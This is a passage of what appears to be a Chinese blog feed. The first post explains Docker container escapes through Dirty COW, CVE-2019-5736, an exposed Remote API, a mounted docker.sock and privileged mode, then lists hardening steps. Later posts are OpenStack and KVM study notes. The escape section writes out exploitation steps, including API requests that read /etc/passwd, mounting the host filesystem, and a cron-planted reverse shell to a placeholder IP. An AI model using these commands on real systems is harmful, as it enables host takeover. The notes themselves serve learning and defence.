        <content type="html"><![CDATA[<p>对网上容器安全特别是Docker安全做一些总结。主要是学习容器逃逸这一方向。</p><a id="more"></a><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="内核漏洞：Dirty-COW漏洞逃逸"><a href="#内核漏洞：Dirty-COW漏洞逃逸" class="headerlink" title="内核漏洞：Dirty COW漏洞逃逸"></a>内核漏洞：Dirty COW漏洞逃逸</h3><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。<br>竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。VDSO就是Virtual Dynamic Shared Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。<br>在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p><h3 id="容器服务缺陷：CVE-2019-5736漏洞逃逸"><a href="#容器服务缺陷：CVE-2019-5736漏洞逃逸" class="headerlink" title="容器服务缺陷：CVE-2019-5736漏洞逃逸"></a>容器服务缺陷：CVE-2019-5736漏洞逃逸</h3><p>1、漏洞原理：<br>Docker、containerd或者其他基于runc的容器在运行时存在安全漏洞，攻击者可以通过特定的容器镜像或者exec操作获取到宿主机runc执行时的文件句柄并修改掉runc的二进制文件，从而获取到宿主机的root执行权限。</p><p>(Go脚本)[<a href="https://github.com/Frichetten/CVE-2019-5736-PoC]">https://github.com/Frichetten/CVE-2019-5736-PoC]</a></p><h3 id="配置不当引发的docker逃逸"><a href="#配置不当引发的docker逃逸" class="headerlink" title="配置不当引发的docker逃逸"></a>配置不当引发的docker逃逸</h3><p>docker swarm是管理docker集群的工具。主从管理、默认通过2375端口通信。绑定了一个Docker Remote API的服务，可以通过HTTP、Python、调用API来操作Docker。</p><p>通过命令<code>dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375</code>即可在公网访问docker</p><ol><li>漏洞利用<ul><li>列出所有容器，得到id字段<code>http://x.x.x.x:2375/containers/json</code></li><li>创建一个exec<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;containers&#x2F;&lt;container_id&gt;&#x2F;exec HTTP&#x2F;1.1 </span><br><span class="line">Host: &lt;docker_host&gt;:PORT </span><br><span class="line">Content-Type: application&#x2F;json </span><br><span class="line">Content-Length: 188 </span><br><span class="line">&#123;  </span><br><span class="line">&quot;AttachStdin&quot;: true,  </span><br><span class="line">&quot;AttachStdout&quot;: true,  </span><br><span class="line">&quot;AttachStderr&quot;: true,  </span><br><span class="line">&quot;Cmd&quot;: [&quot;cat&quot;, &quot;&#x2F;etc&#x2F;passwd&quot;],  </span><br><span class="line">&quot;DetachKeys&quot;: &quot;ctrl-p,ctrl-q&quot;,  </span><br><span class="line">&quot;Privileged&quot;: true,  </span><br><span class="line">&quot;Tty&quot;: true </span><br><span class="line">&#125;&#96;&#96;&#96;</span><br></pre></td></tr></table></figure></li></ul></li></ol><ul><li>使用burp模拟post请求发包，得到返回的id参数</li><li>启动exec，成功执行系统命令，读取到passwd文件<figure class="highlight plain"><figcaption><span>/exec/<exec_id>/start HTTP/1.1</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Host: &lt;docker_host&gt;:PORT</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"> &quot;Detach&quot;: false,</span><br><span class="line"> &quot;Tty&quot;: false</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>在容器内部安装Docker作为client</li><li>查看宿主机docker镜像信息<code>docker -H tcp://x.x.x.x:2375 images</code></li><li>启动一个容器并将宿主机根目录挂在到容器的user目录<code>docker -H tcp://x.x.x.x:2375 run -it -v /:/user container_id /bin/bash </code></li><li>写计划任务反弹shell<code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/8877 0&gt;&amp;1&#39; &gt;&gt; /user/var/spool/cron/root</code></li><li>获取宿主机shell</li></ul><h2 id="docker-sock挂载到容器内部"><a href="#docker-sock挂载到容器内部" class="headerlink" title="docker.sock挂载到容器内部"></a>docker.sock挂载到容器内部</h2><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>Docker采用C/S架构（docker为client，docker daemon为server）</p><p>宿主机与docker通信方式有以下三种：</p><ol><li>unix:///var/run/docker.sock</li><li>tcp://host:port</li><li>fd://socketfd</li></ol><p>默认通信方式为docker.sock，需要挂载/var/run/docker.sock文件</p><p>注：能够访问docker socket或连接HTTPS API的进程可以执行Docker服务能够运行的任意命令，以root权限运行的Docker服务可以访问整个主机系统。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ol><li>运行一个挂载/var/run/的容器<code>docker run -it -v /var/run/:/host/var/run/container_id /bin/bash</code></li><li>寻找下挂载的sock文件<code>find / -name docker.sock</code></li><li>在容器内安装Docker作为client<code>apt-get install docker</code></li><li>查看宿主机docker信息<code>docker -H unix:///host/var/run/docker.socker info</code></li><li>运行一个新容器并挂载宿主机根路径<code>docker -H unix:///host/var/run/docker.sock run -v /:/aa -it ubuntu:14.04 /bin/bash </code></li><li>在新容器/user路径下完成对宿主机资源的访问</li><li>写入计划任务文件，反弹shell<code>echo &#39;* * * * * bash -i &gt;&amp; /dev/tcp/x.x.x.x/9988 0&gt;&amp;1&#39; &gt;&gt; /user/var/spool/cron/root</code></li><li>成功接收到宿主机反弹的shell<code>nc -lvp 9988</code></li></ol><h3 id="特权模式"><a href="#特权模式" class="headerlink" title="特权模式"></a>特权模式</h3><p>允许容器内的root拥有外部物理机root权限。</p><p>使用特权模式启动容器，可以获取大量文件访问权限，执行<code>docker run --privileged</code>时，docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</p><p>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</p><h2 id="如何保证生产环境中容器的安全？"><a href="#如何保证生产环境中容器的安全？" class="headerlink" title="如何保证生产环境中容器的安全？"></a>如何保证生产环境中容器的安全？</h2><ol><li>对docker宿主机进行安全加固</li><li>限制容器之间的网络流量<code>--icc=false</code></li><li>配置docker deamon守护程序的TSL身份验证（Docker程序不能暴露在公网端口）</li><li>启动用户命名空间支持</li><li>限制容器的内存使用量（创建时添加参数<code>-m</code>）</li><li>适当设置容器CPU优先级（防止资源耗尽）</li></ol><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1gh6oyisonnj309w08twfd.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1gh6oyisonnj309w08twfd.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]8-镜像Glance.md</title>
      <link href="2020/07/20/%5BOpenStack%5D8-%E9%95%9C%E5%83%8FGlance/"/>
      <url>2020/07/20/%5BOpenStack%5D8-%E9%95%9C%E5%83%8FGlance/</url>
      
        <content type="html"><![CDATA[<p>OpenStack Glance基础。</p><a id="more"></a><h2 id="Image"><a href="#Image" class="headerlink" title="Image"></a>Image</h2><p>OpenStack配置系统流程：</p><ol><li>先手工安装好一台虚拟机</li><li>然后对虚拟机执行snapshot，因此获得一个images</li><li>当建立新的办公环境时，立马启动一个或多个该image的instance虚拟机就可以</li></ol><p><strong>snapshot</strong>：具备备份作用，能够非常方便的恢复系统。</p><h2 id="Image-Service"><a href="#Image-Service" class="headerlink" title="Image Service"></a>Image Service</h2><p>Image Service功能：管理Image，使得用户能够发现、获取和保存Images。由Glance提供支持，其具备的功能有：</p><ol><li>提供REST API让用户能够查询和获取images的元数据和image本身</li><li>支持多种方式存储image，包括普通的文件系统、Swift等</li><li>对Instance执行Snapshot创建新的images</li></ol><h2 id="Glance架构"><a href="#Glance架构" class="headerlink" title="Glance架构"></a>Glance架构</h2><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx6vmkjioj30xj0u0gxn.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggx6vmkjioj30xj0u0gxn.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;"> Glance 架构图</div> </center><p>图片名词解释：</p><h3 id="glance-api"><a href="#glance-api" class="headerlink" title="glance-api"></a>glance-api</h3><p>系统后台运行的服务进程。对外提供REST API，响应image查询、获取和存储的调用。</p><p>glance-api不会处理请求。若操作与image metadata（元数据）相关，glance-api会把请求转发给glance-registry；若与image自身存取相关，glance-api会把请求转发给image的store backend。</p><p>在控制节点查看glance-api进程 <code>ps -e | grep glance-api</code></p><h3 id="galnce-registry"><a href="#galnce-registry" class="headerlink" title="galnce-registry"></a>galnce-registry</h3><h3 id="Database"><a href="#Database" class="headerlink" title="Database"></a>Database</h3><h3 id="Store-backend"><a href="#Store-backend" class="headerlink" title="Store backend"></a>Store backend</h3><h2 id="Glance操作"><a href="#Glance操作" class="headerlink" title="Glance操作"></a>Glance操作</h2><h2 id="OpenStack-CLI"><a href="#OpenStack-CLI" class="headerlink" title="OpenStack CLI"></a>OpenStack CLI</h2><h2 id="Troubleshoot"><a href="#Troubleshoot" class="headerlink" title="Troubleshoot"></a>Troubleshoot</h2>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]7-认证Keystone</title>
      <link href="2020/07/17/%5BOpenStack%5D7-%E8%AE%A4%E8%AF%81Keystone/"/>
      <url>2020/07/17/%5BOpenStack%5D7-%E8%AE%A4%E8%AF%81Keystone/</url>
      
        <content type="html"><![CDATA[<p>OpenStack Keystone基础。</p><a id="more"></a><h2 id="Keystone概论"><a href="#Keystone概论" class="headerlink" title="Keystone概论"></a>Keystone概论</h2><p>Keystone主要工作为：</p><ol><li>管理用户及其权限</li><li>维护OpenStack Services的Endpoint</li><li>认证和鉴权</li></ol><p>Keystone主要有以下几个概念：</p><p>User、Credentials、Authentication、Token、Project、Service、Endpoint、Role</p><p>##User </p><p>任何使用OpenStack的实体。（可以是真正的用户，或者是其他系统或服务）</p><p>当User请求访问OpenStack时，Keystone会对其进行验证。</p><p>Horizon在Identity-&gt;Users管理User（缺图）</p><p>默认用户除了admin和demo，OpenStack也为nova、cinder、glance、neutron服务创建了响应的User，使得admin可以管理这些User。</p><h2 id="Credentials"><a href="#Credentials" class="headerlink" title="Credentials"></a>Credentials</h2><p>User用来证明自己身份的信息。（1. 用户名\密码 2.Token 3.API Key 4.其他高级方式）</p><h2 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h2><p>Keystone验证User身份的过程。</p><p>User访问OpenStack时向Keystone提交用户名和密码形式的Credentials，Keystone验证通过后会给User签发一个Token作为后续访问的Credential。</p><h2 id="Token"><a href="#Token" class="headerlink" title="Token"></a>Token</h2><p>Token是由数字和字母组成的字符串，User成功Authentication后Keystion生成Token并分配给User。</p><p>Token的几点特性</p><ol><li>Token用作访问Service的Credential</li><li>Service会通过Keystone验证Token的有效性</li><li>Token的有效期为24小时</li></ol><h2 id="Project"><a href="#Project" class="headerlink" title="Project"></a>Project</h2><p>Project用于将OpenStack的资源进行分组和隔离。</p><p>Project可以是一个客户（公有云），也可以是项目组（私有云）。</p><p>资源的所有权属于Project，而不是user。</p><p>每个user必须挂在Project才能访问该Project的资源。</p><p>一个User可以属于多个Project。</p><p>Horizon在Identity-&gt;Projects管理Project（缺图）</p><p>通过Manage Member将User添加到Project（缺图）</p><h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Service包括计算nova、存储cinder、对象存储swift、磁盘服务glance、网络服务neutron等。</p><p>每个Service都会提供若干个Endpoint，User通过Endpoint访问资源和执行操作。</p><h2 id="Endpoint"><a href="#Endpoint" class="headerlink" title="Endpoint"></a>Endpoint</h2><p>Endpoint是一个网络上可访问的地址url。</p><p>Service通过endpoint暴露自己的API。</p><p>Keystone负责管理和维护每个Service的Endpoint。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看Endpoint命令</span></span><br><span class="line">$ <span class="built_in">source</span> devstack/openrc admin admin</span><br><span class="line">$ openstack catalog list</span><br></pre></td></tr></table></figure><h2 id="Role"><a href="#Role" class="headerlink" title="Role"></a>Role</h2><p>安全包括两个部分：认证Authentication和鉴权Authorization</p><p>Authentication：认证身份</p><p>Authorization：权限管理</p><p>Keystone通过role实现鉴权Authorization</p><ol><li>KeyStone定义role<code>openstack role list</code></li><li>为User分配一个或者多个 Role。（在Horizon-&gt;Identity-&gt;Project-&gt;Manage Members修改）</li><li>Service决定每个Role的权限。（通过各自的policy.json进行修改）</li></ol><h2 id="Keystone工作流程"><a href="#Keystone工作流程" class="headerlink" title="Keystone工作流程"></a>Keystone工作流程</h2>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]6-OpenStack架构以及搭建环境</title>
      <link href="2020/07/05/%5BOpenStack%5D6-OpenStack%E6%9E%B6%E6%9E%84%E4%BB%A5%E5%8F%8A%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/"/>
      <url>2020/07/05/%5BOpenStack%5D6-OpenStack%E6%9E%B6%E6%9E%84%E4%BB%A5%E5%8F%8A%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<p>OpenStack架构以及认证、镜像、计算、存储、网络介绍；OpenStack实验环境搭建与部署。</p><a id="more"></a><h2 id="OpenStack架构"><a href="#OpenStack架构" class="headerlink" title="OpenStack架构"></a>OpenStack架构</h2><p>前面说到作为laaS层的云操作系统，OpenStack为虚拟机提供管理三大类资源：计算、网络、存储。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg1qha1u2j30nf0a0n0k.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg1qha1u2j30nf0a0n0k.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">OpenStack核心</div> </center><p>OpenStack架构图</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg27ri3c6j30v60n2jxf.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg27ri3c6j30v60n2jxf.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">Conceptual Architecture</div> </center><p><strong>VM</strong>：虚拟机</p><p><strong>Nova</strong>：管理VM的生命周期，是OpenStack中最核心的服务。</p><p><strong>Neutron</strong>：为OpenStack提供网络连接服务，负责创建和管理L2、L3网络，为VM提供虚拟物理和物理网络连接。</p><p><strong>Glance</strong>：管理VM启动镜像，Nova创建VM时将使用Glance提供的镜像</p><p><strong>Cinder</strong>：为VM提供块存储服务。Cinder提供的每一个Volume对于VM来说就是一块虚拟数据盘。</p><p><strong>Swift</strong>：提供对象存储服务。VM通过RESTful API存放对象数据。Glance可以将镜像存放在Swift中；CInder也可以将Volume备份到Swift中。</p><p><strong>Keystone</strong>：为OpenStack的各种服务提供认证和权限管理服务。</p><p><strong>Cellmeter</strong>：提供OpenStack监控和计量服务，为报警、统计或计费提供数据。</p><p><strong>Horizon</strong>：为OpenStack提供一个Web的自服务Portal。</p><table><thead><tr><th>名称</th><th>功能</th><th>服务类型</th></tr></thead><tbody><tr><td>Nova</td><td>管理计算资源</td><td>核心服务</td></tr><tr><td>Neutron</td><td>管理网络资源</td><td>核心服务</td></tr><tr><td>Glance</td><td>存储OS镜像</td><td>核心服务</td></tr><tr><td>Cinder</td><td>提供块存储</td><td>核心服务</td></tr><tr><td>Swift</td><td>提供对象存储</td><td>可选服务</td></tr><tr><td>Keystone</td><td>认证服务</td><td>核心服务</td></tr><tr><td>Ceilometer</td><td>监控服务</td><td>可选服务</td></tr><tr><td>Horizon</td><td>操作界面</td><td>核心服务</td></tr></tbody></table><p>逻辑结构图</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg3gl1gbzj30v40mbk93.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg3gl1gbzj30v40mbk93.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">Logical Architecture</div> </center><p>逻辑结构图，描述的是各服务各个组成部件以及各组件之间的逻辑关系，在实际部署方案上，各个组件可以部署到不同的物理节点上。</p><p>之后学习核心服务：Keystone、Glance、Nova、Neutron、Cinder。</p><h2 id="搭建实验环境"><a href="#搭建实验环境" class="headerlink" title="搭建实验环境"></a>搭建实验环境</h2><h3 id="部署拓扑介绍"><a href="#部署拓扑介绍" class="headerlink" title="部署拓扑介绍"></a>部署拓扑介绍</h3><p>OpenStack是一个分布式系统，由若干个不同功能的节点组成：</p><table><thead><tr><th>节点名称</th><th>节点功能</th></tr></thead><tbody><tr><td>控制节点</td><td>管理OpenStack，运行Keystone、Glance、Horizon、Nova和Neutron服务。同时也支持SQL数据库、消息队列和网络时间服务NTP。</td></tr><tr><td>网络节点</td><td>运行Neutron服务，为OpenStack提供L2和L3网络。包括虚拟机网络、DHCP、路由、NAT等</td></tr><tr><td>存储节点</td><td>提供CInder或Swift服务。</td></tr><tr><td>计算节点</td><td>运行Hypervisor（KVM）</td></tr></tbody></table><p>注：实际部署时可灵活配置，可以在若干台物理服务器上，也可以在将所有布置在一个虚拟服务器上（ALL-in-One）。</p><p>在实验中，我们用两个虚拟机进行部署：</p><ol><li>devstack-controller：控制节点+网络节点+块存储节点+计算节点</li><li>devstack-computer：计算节点</li></ol><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg5vsshbpj30fk0b6dle.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg5vsshbpj30fk0b6dle.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">devstack部署示意图</div> </center><h3 id="物理资源需求"><a href="#物理资源需求" class="headerlink" title="物理资源需求"></a>物理资源需求</h3><table><thead><tr><th></th><th>CPU</th><th>RAM</th><th>Storage</th><th>nic</th></tr></thead><tbody><tr><td>Devstack-controller</td><td>1-2</td><td>4GB</td><td>10GB</td><td>3</td></tr><tr><td>Devstack-conputer</td><td>2-4</td><td>8GB</td><td>20GB</td><td>2</td></tr></tbody></table><h3 id="网络规划"><a href="#网络规划" class="headerlink" title="网络规划"></a>网络规划</h3><p><strong>Management Network</strong>：用于OpenStack内部管理使用，各服务之间通信。（eth0）</p><p><strong>VM Network</strong>：OpenStack部署的虚拟机所使用的网络。（eth1）</p><p><strong>External Network</strong>：由于VM Network是内部私有网络，只用于VM之间通信。规划一个External Network，通过devstack-controller的eth2连接。Neutron通过L3服务访问到External Network（Internet）。</p><h3 id="配置devstack-controller"><a href="#配置devstack-controller" class="headerlink" title="配置devstack-controller"></a>配置devstack-controller</h3>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]5-云计算与OpenStack</title>
      <link href="2020/07/05/OpenStack-5-%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8EOpenStack/"/>
      <url>2020/07/05/OpenStack-5-%E4%BA%91%E8%AE%A1%E7%AE%97%E4%B8%8EOpenStack/</url>
      
        <content type="html"><![CDATA[<p>云计算与OpenStack一些相关知识。</p><a id="more"></a><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg0iscqdoj30l8084tfj.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg0iscqdoj30l8084tfj.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">IT系统架构发展的三个阶段</div> </center><ol><li>物理机架构：应用部署和运行在物理机上。规模不大的系统，可以找3台物理机，分别部署Web服务器、应用服务器和数据库服务器；规模再大一点，可以采用集群架构，每个集群成员直接部署在物理机上。物理机架构系统资源使用率很低。</li><li>虚拟化架构：物理机上运行若干虚拟机，应用系统直接部署在虚拟机上。虚拟化的好处体现在减少了需要管理的物理机数量，节省维护成本。</li><li>云计算架构：虚拟化提高了单台物理机的资源使用率，云计算就是对IT环境中的虚拟机进行统一和高效的管理。</li></ol><p>通过云计算平台，建立一个计算（CPU/内存）、存储和网络资源库，当虚拟机的用户需要时，只需向云计算提供该虚拟机的规格，云计算平台从资源库中调出即可，使用者不需要关心虚拟机的各种情况（计算、存储、网络分配）。</p><p>云平台是一个面向服务的架构。按照提供服务可以分为<strong>laaS</strong>、<strong>PaaS</strong>、<strong>SaaS</strong>。</p><center>    <img style="border-radius: 0.3125em;    box-shadow: 0 2px 4px 0 rgba(34,36,38,.12),0 2px 10px 0 rgba(34,36,38,.08);"     src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg0u9px5aj30hz0c3wnb.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggg0u9px5aj30hz0c3wnb.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=">    <br>    <div style="color:orange; border-bottom: 1px solid #d9d9d9;    display: inline-block;    color: #999;    padding: 2px;">云平台服务示意图</div> </center><p><strong>laaS（Infrastructure as a Service）</strong>：laaS负责管理虚拟机的生命周期（创建、修改、备份、启停、销毁等操作）。使用者只需关心虚拟机的系统、配置，并自己部署上层的中间件和应用。laaS的使用者通常是数据中心的系统管理员。常见的laaS有AWS、Rackspace、阿里云等。</p><p>**PaaS(Platform as a Service)**：提供应用的运行环境和一些列中间件服务。使用者只需专注应用的开发，并将自己的应用和数据部署到PaaS环境中。PaaS保证这些服务的可靠性和性能。PaaS的使用者通常是应用的开发人员。常见的PaaS有Heroku、Google APP Engine、IBM BlueMix等。</p><p><strong>SaaS（Software as a Service）</strong>：提供应用服务。使用者只需登录并使用应用，不需要关注应用的技术和部署细节。SaaS的使用者通常是终端用户。常见的SaaS有Google Gmali、Salesforce等。</p><p><strong>OpenStack</strong>：OpenStack对数据中心的计算、存储和网络资源进行统一管理。属于laaS层次的云操作系统。</p>]]></content>
      
      
      <categories>
          
          <category> OpenStack </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>[OpenStack]4-KVM虚拟化原理</title>
      <link href="2020/07/03/OpenStack-4-KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%8E%9F%E7%90%86/"/>
      <url>2020/07/03/OpenStack-4-KVM%E8%99%9A%E6%8B%9F%E5%8C%96%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p>KVM一些底层原理</p><a id="more"></a><h2 id="CPU虚拟化"><a href="#CPU虚拟化" class="headerlink" title="CPU虚拟化"></a>CPU虚拟化</h2><p>利用命令查看CPU是否支持KVM虚拟化</p><p>输出带有vmx或svm，就说明当前CPU支持KVM</p><p><code>$ egrep -o &#39;(vmx|svm)&#39; /proc/cpuinfo</code></p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdqy91bnvj314o03a74b.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdqy91bnvj314o03a74b.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20200703140246566"></p><p>一个KVM虚拟机就是主机中一个qemu-kvm进程</p><p>虚拟机中的每一个虚拟vCPU对应qemu-kvm进程中的一个进程</p><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdr47wv6sj310o0m6h3d.jpg" class="lazyload" data-srcset="https://tva1.sinaimg.cn/large/007S8ZIlly1ggdr47wv6sj310o0m6h3d.jpg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" 